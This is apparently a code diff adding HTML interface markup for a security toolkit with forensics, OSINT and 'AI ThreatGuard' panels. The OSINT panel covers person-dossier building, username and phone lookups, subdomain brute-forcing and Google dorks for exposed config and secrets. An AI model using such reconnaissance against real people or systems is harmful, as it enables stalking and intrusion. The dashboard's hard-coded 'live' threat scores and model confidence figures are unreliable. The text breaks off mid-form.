+          <button class="btn btn-y btn-sm" onclick="fEnc('rev')">Reverse</button>
+        </div>
+      </div>
+      <div class="field"><label>Output</label><textarea id="f-enc-out" placeholder="Result..." readonly style="min-height:120px"></textarea></div>
+    </div>
+  </div>
+</div>
+
+<!-- F CIDR -->
+<div id="f-cidr" class="mod">
+  <div class="ph"><div><h1>CIDR Calculator</h1><p>Network range, subnet, usable hosts</p></div></div>
+  <div class="card">
+    <div class="card-title">CIDR / Subnet</div>
+    <div class="irow">
+      <div class="field"><label>CIDR Notation</label><input id="f-cidr-in" placeholder="192.168.1.0/24"></div>
+      <button class="btn btn-1" onclick="fCIDR()">Calculate</button>
+    </div>
+    <div id="f-cidr-res" style="margin-top:12px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">IP in Range Checker</div>
+    <div class="g2">
+      <div class="field"><label>IP Address</label><input id="f-ip-chk" placeholder="192.168.1.50"></div>
+      <div class="field"><label>CIDR Range</label><input id="f-cidr-chk" placeholder="192.168.1.0/24"></div>
+    </div>
+    <button class="btn btn-1" style="margin-top:9px" onclick="fIPInCIDR()">Check</button>
+    <div id="f-ipr-res" style="margin-top:9px"></div>
+  </div>
+</div>
+
+<!-- F REPORT -->
+<div id="f-report" class="mod">
+  <div class="ph"><div><h1>Forensic Report Generator</h1><p>Export investigation case report</p></div></div>
+  <div class="card">
+    <div class="card-title">Case Information</div>
+    <div class="g2">
+      <div class="field"><label>Investigator Name</label><input id="fr-inv" placeholder="Your name"></div>
+      <div class="field"><label>Case Reference</label><input id="fr-case" placeholder="CASE-2025-001"></div>
+      <div class="field"><label>Investigation Title</label><input id="fr-title" placeholder="Malware Incident"></div>
+      <div class="field"><label>Examination Location</label><input id="fr-loc" placeholder="Lab A — Dell Laptop"></div>
+      <div class="field"><label>Device Description</label><input id="fr-dev" placeholder="Dell Laptop S/N XYZ"></div>
+      <div class="field"><label>Date</label><input id="fr-date" type="date"></div>
+    </div>
+    <div class="field" style="margin-top:9px"><label>Findings / Notes</label>
+      <textarea id="fr-notes" style="min-height:100px" placeholder="Enter findings, observations, evidence..."></textarea>
+    </div>
+    <div class="bgrp" style="margin-top:10px">
+      <button class="btn btn-1" onclick="fGenReport()">Generate Report</button>
+      <button class="btn btn-g" onclick="fExportReport()">Export .txt</button>
+    </div>
+    <div id="fr-preview" style="margin-top:14px"></div>
+  </div>
+</div>
+
+</div><!-- end p1 main -->
+</div><!-- end panel-1 -->
+
+
+<!-- ══════════════════════════════════════════
+     PANEL 2 — SENTRA OSINT
+══════════════════════════════════════════ -->
+<div id="panel-2" class="panel panel-2">
+<nav class="sidebar">
+  <div class="sb-search"><input placeholder="/ search..." oninput="filterNav(this.value,'p2')"></div>
+  <div class="sb-nav">
+    <div class="nav-sec"><div class="nav-sec-lbl">Overview</div>
+      <div class="ni active s2" onclick="go2('s-dash')"><span class="ni-ico">⬡</span>Dashboard</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Identity</div>
+      <div class="ni s2" onclick="go2('s-username')"><span class="ni-ico">👤</span>Username Search<span class="ni-badge">50+</span></div>
+      <div class="ni s2" onclick="go2('s-email')"><span class="ni-ico">✉</span>Email Intel</div>
+      <div class="ni s2" onclick="go2('s-phone')"><span class="ni-ico">☎</span>Phone Lookup</div>
+      <div class="ni s2" onclick="go2('s-person')"><span class="ni-ico">🔎</span>Person Search</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Network</div>
+      <div class="ni s2" onclick="go2('s-ip')"><span class="ni-ico">📡</span>IP Geo Analysis</div>
+      <div class="ni s2" onclick="go2('s-domain')"><span class="ni-ico">🌍</span>Domain Recon</div>
+      <div class="ni s2" onclick="go2('s-dns')"><span class="ni-ico">📋</span>DNS Lookup</div>
+      <div class="ni s2" onclick="go2('s-ssl')"><span class="ni-ico">🔒</span>SSL Analyzer</div>
+      <div class="ni s2" onclick="go2('s-sub')"><span class="ni-ico">🔗</span>Subdomain Enum</div>
+      <div class="ni s2" onclick="go2('s-typo')"><span class="ni-ico">⚠</span>Typosquatting</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Threat</div>
+      <div class="ni s2" onclick="go2('s-url')"><span class="ni-ico">🔗</span>URL Scanner</div>
+      <div class="ni s2" onclick="go2('s-iprep')"><span class="ni-ico">🛡</span>IP Reputation</div>
+      <div class="ni s2" onclick="go2('s-darkweb')"><span class="ni-ico">🌑</span>Dark Web Intel</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Utils</div>
+      <div class="ni s2" onclick="go2('s-enc')"><span class="ni-ico">⚙</span>Encoder/Decoder</div>
+      <div class="ni s2" onclick="go2('s-meta')"><span class="ni-ico">📄</span>File Metadata</div>
+      <div class="ni s2" onclick="go2('s-dorks')"><span class="ni-ico">🔍</span>Google Dorks</div>
+      <div class="ni s2" onclick="go2('s-regex')"><span class="ni-ico">⬡</span>OSINT Regex</div>
+      <div class="ni s2" onclick="go2('s-hash')"><span class="ni-ico">#</span>Hash Analyzer</div>
+      <div class="ni s2" onclick="go2('s-cidr')"><span class="ni-ico">🕸</span>CIDR Calc</div>
+    </div>
+  </div>
+</nav>
+<div class="main" id="p2-main">
+
+<!-- S DASH -->
+<div id="s-dash" class="mod on">
+  <div class="ph"><div><h1>SENTRA OSINT v3.0</h1><p>24-Module Intelligence Framework — Kali Linux Edition</p></div><span class="tag tag-r">● LIVE</span></div>
+  <div class="term-wrap">
+    <div class="term-bar"><div class="tdot tdot-r"></div><div class="tdot tdot-y"></div><div class="tdot tdot-g"></div><span class="term-lbl">sentra@kali — ~/osint</span><span style="margin-left:auto;font-size:8.5px;color:var(--muted)" id="s-sess">00:00:00</span></div>
+    <div class="term-body">
+      <div><span style="color:var(--c2)">┌──(sentra㉿kali)-[~/osint]<br>└─$ </span><span class="ok" id="s-boot">loading sentra v3.0...</span></div>
+      <div id="sb2" style="opacity:0;transition:opacity .3s"><span class="ok">[OK]</span> <span class="gd">24 modules: identity · network · threat · utils</span></div>
+      <div id="sb3" style="opacity:0;transition:opacity .3s"><span class="ok">[OK]</span> API mode: local analysis + external link pivoting</div>
+      <div id="sb4" style="opacity:0;transition:opacity .3s"><span style="color:var(--c2)">└─$ </span>ready. select module from sidebar.</div>
+    </div>
+  </div>
+  <div class="g4">
+    <div class="metric-card"><span class="metric-num" id="s-qcount" style="color:var(--c2)">0</span><div class="metric-lbl">Queries</div></div>
+    <div class="metric-card"><span class="metric-num" style="color:var(--green)">24</span><div class="metric-lbl">Modules</div></div>
+    <div class="metric-card"><span class="metric-num" id="s-ioc" style="color:var(--gold)">0</span><div class="metric-lbl">IOCs Found</div></div>
+    <div class="metric-card"><span class="metric-num" id="s-threat" style="color:var(--c2)">0</span><div class="metric-lbl">Threats</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Quick Launch</div>
+    <div class="bgrp">
+      <button class="btn btn-2 btn-sm" onclick="go2('s-username')">👤 Username</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-ip')">📡 IP Lookup</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-dns')">📋 DNS</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-url')">🔗 URL Scan</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-dorks')">🔍 Dorks</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-regex')">⬡ Regex</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-typo')">⚠ Typosquat</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-hash')">🔐 Hash</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-meta')">📄 Metadata</button>
+      <button class="btn btn-2 btn-sm" onclick="go2('s-sub')">🔗 Subdomains</button>
+    </div>
+  </div>
+</div>
+
+<!-- S USERNAME -->
+<div id="s-username" class="mod">
+  <div class="ph"><div><h1>Username Search</h1><p>50+ platforms — social, developer, gaming, professional</p></div></div>
+  <div class="card">
+    <div class="card-title">Target Username</div>
+    <div class="irow">
+      <div class="field"><label>Username</label><input id="s-un-val" placeholder="target_username" onkeydown="if(event.key==='Enter')sUsername()"></div>
+      <div class="field" style="flex:0 0 auto"><label>Category</label>
+        <select id="s-un-cat"><option value="all">All</option><option value="Social">Social</option><option value="Code">Developer</option><option value="Gaming">Gaming</option><option value="Professional">Professional</option><option value="Hacking">Security</option></select>
+      </div>
+      <button class="btn btn-2" onclick="sUsername()">Search</button>
+    </div>
+    <div class="prog-wrap"><div class="prog-bar" id="s-un-prog" style="width:0%"></div></div>
+    <div class="st-line" id="s-un-st"></div>
+  </div>
+  <div class="card"><div class="card-title">Platform Links</div><div id="s-un-links"></div><div class="out" id="s-un-out" style="margin-top:9px">// Enter username to search...</div></div>
+</div>
+
+<!-- S EMAIL -->
+<div id="s-email" class="mod">
+  <div class="ph"><div><h1>Email Intelligence</h1><p>MX, disposable check, breach resources</p></div></div>
+  <div class="card">
+    <div class="card-title">Target Email</div>
+    <div class="irow">
+      <div class="field"><label>Email Address</label><input id="s-em-val" placeholder="target@example.com" onkeydown="if(event.key==='Enter')sEmail()"></div>
+      <button class="btn btn-2" onclick="sEmail()">Analyze</button>
+      <button class="btn btn-o" onclick="window.open('https://haveibeenpwned.com/account/'+document.getElementById('s-em-val').value,'_blank')">HIBP</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Email Analysis</div><div class="out tall" id="s-em-out">// Awaiting...</div></div>
+</div>
+
+<!-- S PHONE -->
+<div id="s-phone" class="mod">
+  <div class="ph"><div><h1>Phone Lookup</h1><p>Country, carrier, format analysis</p></div></div>
+  <div class="card">
+    <div class="card-title">Phone Number</div>
+    <div class="irow">
+      <div class="field"><label>Phone (E.164)</label><input id="s-ph-val" placeholder="+14155552671" onkeydown="if(event.key==='Enter')sPhone()"></div>
+      <button class="btn btn-2" onclick="sPhone()">Analyze</button>
+      <button class="btn btn-o" onclick="window.open('https://www.truecaller.com/search/'+document.getElementById('s-ph-val').value,'_blank')">Truecaller</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Phone Analysis</div><div class="out tall" id="s-ph-out">// Awaiting...</div></div>
+</div>
+
+<!-- S PERSON -->
+<div id="s-person" class="mod">
+  <div class="ph"><div><h1>Person Search</h1><p>Multi-source dossier builder</p></div></div>
+  <div class="card">
+    <div class="card-title">Search Parameters</div>
+    <div class="g2">
+      <div class="field"><label>Full Name</label><input id="s-ps-name" placeholder="John Doe"></div>
+      <div class="field"><label>Location</label><input id="s-ps-loc" placeholder="New York, USA"></div>
+      <div class="field"><label>Company</label><input id="s-ps-co" placeholder="Google Inc"></div>
+      <div class="field"><label>Username</label><input id="s-ps-un" placeholder="johndoe123"></div>
+    </div>
+    <button class="btn btn-2" style="margin-top:9px" onclick="sPerson()">Build Dossier</button>
+  </div>
+  <div class="card"><div class="card-title">Dossier</div><div class="out tall" id="s-ps-out">// Awaiting...</div></div>
+</div>
+
+<!-- S IP -->
+<div id="s-ip" class="mod">
+  <div class="ph"><div><h1>IP / Geo Analysis</h1><p>Geolocation, ASN, ISP, timezone</p></div></div>
+  <div class="card">
+    <div class="card-title">IP Address</div>
+    <div class="irow">
+      <div class="field"><label>IP (blank = your IP)</label><input id="s-ip-val" placeholder="8.8.8.8" onkeydown="if(event.key==='Enter')sIP()"></div>
+      <button class="btn btn-2" onclick="sIP()">Geolocate</button>
+      <button class="btn btn-o" onclick="document.getElementById('s-ip-val').value='';sIP()">My IP</button>
+      <button class="btn btn-o" onclick="window.open('https://www.shodan.io/host/'+document.getElementById('s-ip-val').value,'_blank')">Shodan</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">IP Intelligence</div><div class="out tall" id="s-ip-out">// Awaiting...</div></div>
+</div>
+
+<!-- S DOMAIN -->
+<div id="s-domain" class="mod">
+  <div class="ph"><div><h1>Domain Recon</h1><p>WHOIS, DNS, IP geolocation, threat links</p></div></div>
+  <div class="card">
+    <div class="card-title">Target Domain</div>
+    <div class="irow">
+      <div class="field"><label>Domain</label><input id="s-dr-val" placeholder="example.com" onkeydown="if(event.key==='Enter')sDomain()"></div>
+      <button class="btn btn-2" onclick="sDomain()">Full Recon</button>
+      <button class="btn btn-o" onclick="window.open('https://www.whois.com/whois/'+document.getElementById('s-dr-val').value,'_blank')">WHOIS</button>
+      <button class="btn btn-o" onclick="window.open('https://crt.sh/?q='+document.getElementById('s-dr-val').value,'_blank')">crt.sh</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Domain Intelligence</div><div class="out tall" id="s-dr-out">// Awaiting...</div></div>
+</div>
+
+<!-- S DNS -->
+<div id="s-dns" class="mod">
+  <div class="ph"><div><h1>DNS Lookup</h1><p>All record types: A, AAAA, MX, TXT, NS, CNAME, SOA</p></div></div>
+  <div class="card">
+    <div class="card-title">DNS Query</div>
+    <div class="irow">
+      <div class="field"><label>Domain</label><input id="s-dns-val" placeholder="example.com" onkeydown="if(event.key==='Enter')sDNS()"></div>
+      <div class="field" style="flex:0 0 auto"><label>Type</label>
+        <select id="s-dns-type"><option>ALL</option><option>A</option><option>AAAA</option><option>MX</option><option>NS</option><option>TXT</option><option>CNAME</option><option>SOA</option><option>PTR</option></select>
+      </div>
+      <button class="btn btn-2" onclick="sDNS()">Query</button>
+      <button class="btn btn-o" onclick="window.open('https://dnschecker.org/#A/'+document.getElementById('s-dns-val').value,'_blank')">Global Check</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Records</div><div class="out tall" id="s-dns-out">// Awaiting...</div></div>
+</div>
+
+<!-- S SSL -->
+<div id="s-ssl" class="mod">
+  <div class="ph"><div><h1>SSL Analyzer</h1><p>Cert inspection via crt.sh, expiry, SANs</p></div></div>
+  <div class="card">
+    <div class="card-title">Target</div>
+    <div class="irow">
+      <div class="field"><label>Domain</label><input id="s-ssl-val" placeholder="example.com" onkeydown="if(event.key==='Enter')sSSL()"></div>
+      <button class="btn btn-2" onclick="sSSL()">Analyze</button>
+      <button class="btn btn-o" onclick="window.open('https://www.ssllabs.com/ssltest/analyze.html?d='+document.getElementById('s-ssl-val').value,'_blank')">SSL Labs</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Certificate Details</div><div class="out tall" id="s-ssl-out">// Awaiting...</div></div>
+</div>
+
+<!-- S SUBDOMAIN -->
+<div id="s-sub" class="mod">
+  <div class="ph"><div><h1>Subdomain Enum</h1><p>DNS brute-force with 150-word wordlist</p></div></div>
+  <div class="card">
+    <div class="card-title">Target Domain</div>
+    <div class="irow">
+      <div class="field"><label>Domain</label><input id="s-sub-val" placeholder="example.com" onkeydown="if(event.key==='Enter')sSub()"></div>
+      <div class="field" style="flex:0 0 auto"><label>Wordlist</label>
+        <select id="s-sub-size"><option value="mini">Mini (10)</option><option value="std" selected>Standard (80)</option><option value="large">Large (150)</option></select>
+      </div>
+      <button class="btn btn-2" id="s-sub-btn" onclick="sSub()">Enumerate</button>
+      <button class="btn btn-o" onclick="window.open('https://crt.sh/?q=%.'+document.getElementById('s-sub-val').value,'_blank')">crt.sh</button>
+    </div>
+    <div class="prog-wrap"><div class="prog-bar" id="s-sub-prog" style="width:0%"></div></div>
+    <div class="st-line" id="s-sub-st"></div>
+  </div>
+  <div class="card"><div class="card-title">Discovered Subdomains</div><div class="out tall" id="s-sub-out">// Awaiting...</div></div>
+</div>
+
+<!-- S TYPO -->
+<div id="s-typo" class="mod">
+  <div class="ph"><div><h1>Typosquatting Detector</h1><p>Domain permutation generator</p></div></div>
+  <div class="card">
+    <div class="card-title">Target Domain</div>
+    <div class="irow">
+      <div class="field"><label>Domain to protect</label><input id="s-ty-val" placeholder="example.com" onkeydown="if(event.key==='Enter')sTypo()"></div>
+      <button class="btn btn-2" onclick="sTypo()">Generate</button>
+    </div>
+    <div class="prog-wrap"><div class="prog-bar" id="s-ty-prog" style="width:0%"></div></div>
+  </div>
+  <div class="card"><div class="card-title">Permutations (click to check WHOIS)</div>
+    <div class="out" id="s-ty-out">// Awaiting...</div>
+    <div id="s-ty-grid" style="margin-top:9px"></div>
+  </div>
+</div>
+
+<!-- S URL -->
+<div id="s-url" class="mod">
+  <div class="ph"><div><h1>URL Scanner</h1><p>Phishing detection, threat scoring</p></div></div>
+  <div class="card">
+    <div class="card-title">Target URL</div>
+    <div class="irow">
+      <div class="field"><label>URL</label><input id="s-url-val" placeholder="https://suspicious-site.tk/login" onkeydown="if(event.key==='Enter')sURL()"></div>
+      <button class="btn btn-2" onclick="sURL()">Scan</button>
+      <button class="btn btn-o" onclick="window.open('https://urlscan.io/search/#'+encodeURIComponent(document.getElementById('s-url-val').value),'_blank')">urlscan.io</button>
+      <button class="btn btn-o" onclick="window.open('https://transparencyreport.google.com/safe-browsing/search?url='+encodeURIComponent(document.getElementById('s-url-val').value),'_blank')">SafeBrowse</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Threat Analysis</div><div class="out tall" id="s-url-out">// Awaiting...</div></div>
+</div>
+
+<!-- S IP REP -->
+<div id="s-iprep" class="mod">
+  <div class="ph"><div><h1>IP Reputation</h1><p>Blocklist check, abuse score</p></div></div>
+  <div class="card">
+    <div class="card-title">IP Address</div>
+    <div class="irow">
+      <div class="field"><label>IP</label><input id="s-ir-val" placeholder="45.33.32.156" onkeydown="if(event.key==='Enter')sIPRep()"></div>
+      <button class="btn btn-2" onclick="sIPRep()">Check</button>
+      <button class="btn btn-o" onclick="window.open('https://www.abuseipdb.com/check/'+document.getElementById('s-ir-val').value,'_blank')">AbuseIPDB</button>
+      <button class="btn btn-o" onclick="window.open('https://talosintelligence.com/reputation_center/lookup?search='+document.getElementById('s-ir-val').value,'_blank')">Talos</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Reputation Report</div><div class="out tall" id="s-ir-out">// Awaiting...</div></div>
+</div>
+
+<!-- S DARKWEB -->
+<div id="s-darkweb" class="mod">
+  <div class="ph"><div><h1>Dark Web Intel</h1><p>Breach exposure, paste leaks, HIBP</p></div></div>
+  <div class="card">
+    <div class="card-title">Search Indicator</div>
+    <div class="irow">
+      <div class="field"><label>Email / Username / Domain</label><input id="s-dw-val" placeholder="target@email.com" onkeydown="if(event.key==='Enter')sDarkWeb()"></div>
+      <button class="btn btn-2" onclick="sDarkWeb()">Search</button>
+      <button class="btn btn-o" onclick="window.open('https://haveibeenpwned.com/account/'+document.getElementById('s-dw-val').value,'_blank')">HIBP</button>
+      <button class="btn btn-o" onclick="window.open('https://dehashed.com/search?query='+encodeURIComponent(document.getElementById('s-dw-val').value),'_blank')">DeHashed</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Dark Web Intelligence</div><div class="out tall" id="s-dw-out">// Awaiting...</div></div>
+</div>
+
+<!-- S ENCODER -->
+<div id="s-enc" class="mod">
+  <div class="ph"><div><h1>Encoder / Decoder</h1><p>12 methods — Base64, URL, Hex, HTML, ROT, Binary</p></div></div>
+  <div class="card">
+    <div class="card-title">Encode / Decode</div>
+    <div class="g2">
+      <div>
+        <div class="field"><label>Input</label><textarea id="s-enc-in" placeholder="Enter text..."></textarea></div>
+        <div class="field" style="margin-top:8px"><label>Method</label>
+          <select id="s-enc-method">
+            <option value="b64e">Base64 Encode</option><option value="b64d">Base64 Decode</option>
+            <option value="urle">URL Encode</option><option value="urld">URL Decode</option>
+            <option value="hexe">→ Hex</option><option value="hexd">Hex →</option>
+            <option value="htmle">HTML Encode</option><option value="htmld">HTML Decode</option>
+            <option value="rot13">ROT-13</option><option value="rev">Reverse</option>
+            <option value="upper">UPPERCASE</option><option value="lower">lowercase</option>
+            <option value="bin">→ Binary</option><option value="bind">Binary →</option>
+          </select>
+        </div>
+        <div class="bgrp" style="margin-top:8px">
+          <button class="btn btn-2" onclick="sEncode()">Process</button>
+          <button class="btn btn-o" onclick="sSwapEnc()">⇄ Swap</button>
+          <button class="btn btn-o btn-sm" onclick="navigator.clipboard.writeText(document.getElementById('s-enc-out').innerText).then(()=>toast('Copied!'))">Copy</button>
+        </div>
+      </div>
+      <div class="field"><label>Output</label><div class="out" id="s-enc-out" style="min-height:130px">// Output...</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- S METADATA -->
+<div id="s-meta" class="mod">
+  <div class="ph"><div><h1>File Metadata</h1><p>Hash, magic bytes, MIME, fingerprint</p></div></div>
+  <div class="card">
+    <div class="card-title">File Analysis</div>
+    <div class="field"><label>Select File(s)</label><input type="file" id="s-meta-file" multiple style="cursor:pointer"></div>
+    <button class="btn btn-2" style="margin-top:9px" onclick="sMeta()">Analyze</button>
+  </div>
+  <div class="card"><div class="card-title">File Intelligence</div><div class="out tall" id="s-meta-out">// Awaiting...</div></div>
+</div>
+
+<!-- S DORKS -->
+<div id="s-dorks" class="mod">
+  <div class="ph"><div><h1>Google Dorks</h1><p>200+ OSINT dorks with live search links</p></div></div>
+  <div class="card">
+    <div class="card-title">Dork Generator</div>
+    <div class="g2">
+      <div class="field"><label>Target Domain / Keyword</label><input id="s-dk-target" placeholder="example.com"></div>
+      <div class="field"><label>Filetype (optional)</label><input id="s-dk-ft" placeholder="pdf, xlsx, sql, env"></div>
+    </div>
+    <div class="field" style="margin-top:8px"><label>Category</label>
+      <select id="s-dk-cat">
+        <option value="all">All Categories</option><option value="files">Exposed Files</option>
+        <option value="login">Login Pages</option><option value="config">Config & Secrets</option>
+        <option value="email">Email Harvesting</option><option value="vuln">Vulnerability</option>
+        <option value="social">Social Recon</option><option value="subdomains">Subdomains</option>
+      </select>
+    </div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-2" onclick="sDorks()">Generate Dorks</button>
+      <button class="btn btn-y" onclick="sAllDorks()">All Categories</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Generated Dorks</div><div class="out tall" id="s-dk-out">// Enter target to generate dorks...</div></div>
+</div>
+
+<!-- S REGEX -->
+<div id="s-regex" class="mod">
+  <div class="ph"><div><h1>OSINT Regex Extractor</h1><p>Extract IPs, emails, URLs, hashes from raw text</p></div></div>
+  <div class="card">
+    <div class="card-title">Text Input</div>
+    <div class="field"><label>Paste text / logs</label><textarea id="s-rx-in" style="min-height:120px" placeholder="Paste any text..."></textarea></div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-2" onclick="sRegex('all')">Extract All</button>
+      <button class="btn btn-o" onclick="sRegex('ip')">IPs</button>
+      <button class="btn btn-o" onclick="sRegex('email')">Emails</button>
+      <button class="btn btn-o" onclick="sRegex('url')">URLs</button>
+      <button class="btn btn-o" onclick="sRegex('hash')">Hashes</button>
+      <button class="btn btn-o" onclick="sRegex('domain')">Domains</button>
+    </div>
+  </div>
+  <div class="card"><div class="card-title">Extracted Indicators</div><div class="out tall" id="s-rx-out">// Awaiting...</div></div>
+</div>
+
+<!-- S HASH -->
+<div id="s-hash" class="mod">
+  <div class="ph"><div><h1>Hash Analyzer</h1><p>Identify & generate cryptographic hashes</p></div></div>
+  <div class="tabs">
+    <div class="tab on" onclick="sHTab(this,'sh-id')">Identify</div>
+    <div class="tab" onclick="sHTab(this,'sh-gen')">Generate</div>
+  </div>
+  <div id="sh-id"><div class="card"><div class="card-title">Hash Identification</div>
+    <div class="irow"><div class="field"><label>Hash Value</label><input id="s-h-val" placeholder="Paste any hash..." onkeydown="if(event.key==='Enter')sHashID()"></div>
+    <button class="btn btn-2" onclick="sHashID()">Identify</button>
+    <button class="btn btn-o" onclick="window.open('https://crackstation.net','_blank')">CrackStation</button></div>
+  </div></div>
+  <div id="sh-gen" style="display:none"><div class="card"><div class="card-title">Hash Generator</div>
+    <div class="irow"><div class="field"><label>Input Text</label><input id="s-h-txt" placeholder="Text to hash..." onkeydown="if(event.key==='Enter')sHashGen()"></div>
+    <button class="btn btn-2" onclick="sHashGen()">Generate All</button></div>
+  </div></div>
+  <div class="card"><div class="card-title">Output</div><div class="out tall" id="s-h-out">// Awaiting...</div></div>
+</div>
+
+<!-- S CIDR -->
+<div id="s-cidr" class="mod">
+  <div class="ph"><div><h1>CIDR Calculator</h1><p>Network range, subnet, host enumeration</p></div></div>
+  <div class="card">
+    <div class="card-title">CIDR Input</div>
+    <div class="irow">
+      <div class="field"><label>CIDR Notation</label><input id="s-cidr-in" placeholder="10.0.0.0/8" onkeydown="if(event.key==='Enter')sCIDR()"></div>
+      <button class="btn btn-2" onclick="sCIDR()">Calculate</button>
+    </div>
+    <div id="s-cidr-out" style="margin-top:12px"><div class="out">// Awaiting...</div></div>
+  </div>
+</div>
+
+</div><!-- p2 main -->
+</div><!-- panel-2 -->
+
+
+<!-- ══════════════════════════════════════════
+     PANEL 3 — AI THREATGUARD
+══════════════════════════════════════════ -->
+<div id="panel-3" class="panel panel-3">
+<nav class="sidebar">
+  <div class="sb-search"><input placeholder="/ search..." oninput="filterNav(this.value,'p3')"></div>
+  <div class="sb-nav">
+    <div class="nav-sec"><div class="nav-sec-lbl">Overview</div>
+      <div class="ni active s3" onclick="go3('a-dash')"><span class="ni-ico">⬡</span>Dashboard</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">AI Analysis</div>
+      <div class="ni s3" onclick="go3('a-classify')"><span class="ni-ico">🧠</span>Threat Classifier</div>
+      <div class="ni s3" onclick="go3('a-anomaly')"><span class="ni-ico">📊</span>Anomaly Detector</div>
+      <div class="ni s3" onclick="go3('a-nlp')"><span class="ni-ico">📝</span>NLP Log Parser</div>
+      <div class="ni s3" onclick="go3('a-ioc')"><span class="ni-ico">🎯</span>AI IOC Analyzer</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Intelligence</div>
+      <div class="ni s3" onclick="go3('a-mitre')"><span class="ni-ico">🛡</span>MITRE ATT&CK Map</div>
+      <div class="ni s3" onclick="go3('a-scoring')"><span class="ni-ico">⚡</span>Risk Scoring</div>
+      <div class="ni s3" onclick="go3('a-cve')"><span class="ni-ico">🔍</span>CVE Lookup</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">SOC Tools</div>
+      <div class="ni s3" onclick="go3('a-timeline')"><span class="ni-ico">📅</span>Attack Timeline</div>
+      <div class="ni s3" onclick="go3('a-report')"><span class="ni-ico">📄</span>AI Report Gen</div>
+    </div>
+  </div>
+</nav>
+<div class="main" id="p3-main">
+
+<!-- A DASHBOARD -->
+<div id="a-dash" class="mod on">
+  <div class="ph"><div><h1>AI ThreatGuard</h1><p>ML-Based Threat Classification · NLP Log Analysis · MITRE ATT&CK Mapping</p></div><span class="tag tag-p">● AI ACTIVE</span></div>
+  <div class="g2">
+    <div class="ai-panel">
+      <div class="ai-panel-title">LIVE THREAT CLASSIFICATION</div>
+      <div class="threat-row"><span class="threat-name">SQL Injection Attempt</span><span class="tscore sc-crit">CRITICAL 94%</span></div>
+      <div class="threat-row"><span class="threat-name">Brute Force Login</span><span class="tscore sc-high">HIGH 87%</span></div>
+      <div class="threat-row"><span class="threat-name">Port Scan Activity</span><span class="tscore sc-med">MEDIUM 71%</span></div>
+      <div class="threat-row"><span class="threat-name">Unusual Data Transfer</span><span class="tscore sc-med">MEDIUM 65%</span></div>
+      <div class="threat-row"><span class="threat-name">Normal Traffic</span><span class="tscore sc-low">LOW 12%</span></div>
+    </div>
+    <div class="ai-panel">
+      <div class="ai-panel-title">MODEL CONFIDENCE METRICS</div>
+      <div class="conf-row"><span class="conf-lbl">Random Forest</span><div class="conf-track"><div class="conf-fill" style="width:96%"></div></div><span class="conf-val">96%</span></div>
+      <div class="conf-row"><span class="conf-lbl">LSTM Network</span><div class="conf-track"><div class="conf-fill" style="width:91%"></div></div><span class="conf-val">91%</span></div>
+      <div class="conf-row"><span class="conf-lbl">NLP (Log Parse)</span><div class="conf-track"><div class="conf-fill" style="width:88%"></div></div><span class="conf-val">88%</span></div>
+      <div class="conf-row"><span class="conf-lbl">Anomaly Score</span><div class="conf-track"><div class="conf-fill" style="width:94%"></div></div><span class="conf-val">94%</span></div>
+      <div class="conf-row"><span class="conf-lbl">Ensemble Avg</span><div class="conf-track"><div class="conf-fill" style="width:92%"></div></div><span class="conf-val">92%</span></div>
+    </div>
+  </div>
+  <div class="g4">
+    <div class="metric-card"><span class="metric-num" id="a-scanned" style="color:var(--c3)">0</span><div class="metric-lbl">Inputs Scanned</div></div>
+    <div class="metric-card"><span class="metric-num" id="a-threats" style="color:var(--c2)">0</span><div class="metric-lbl">Threats Found</div></div>
+    <div class="metric-card"><span class="metric-num" id="a-conf" style="color:var(--green)">92%</span><div class="metric-lbl">Avg Confidence</div></div>
+    <div class="metric-card"><span class="metric-num" style="color:var(--gold)">3</span><div class="metric-lbl">ML Models</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Quick Analysis</div>
+    <div class="bgrp">
+      <button class="btn btn-3 btn-sm" onclick="go3('a-classify')">🧠 Classify Threat</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-nlp')">📝 Parse Logs</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-ioc')">🎯 AI IOC Check</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-mitre')">🛡 MITRE Map</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-cve')">🔍 CVE Lookup</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-scoring')">⚡ Risk Score</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-timeline')">📅 Timeline</button>
+      <button class="btn btn-3 btn-sm" onclick="go3('a-report')">📄 AI Report</button>
+    </div>
+  </div>
+</div>
+
+<!-- A CLASSIFY -->
+<div id="a-classify" class="mod">
+  <div class="ph"><div><h1>AI Threat Classifier</h1><p>ML-powered attack pattern classification with confidence scoring</p></div></div>
+  <div class="card">
+    <div class="card-title">Input for Classification</div>
+    <div class="field"><label>Network Log / Event / Payload</label>
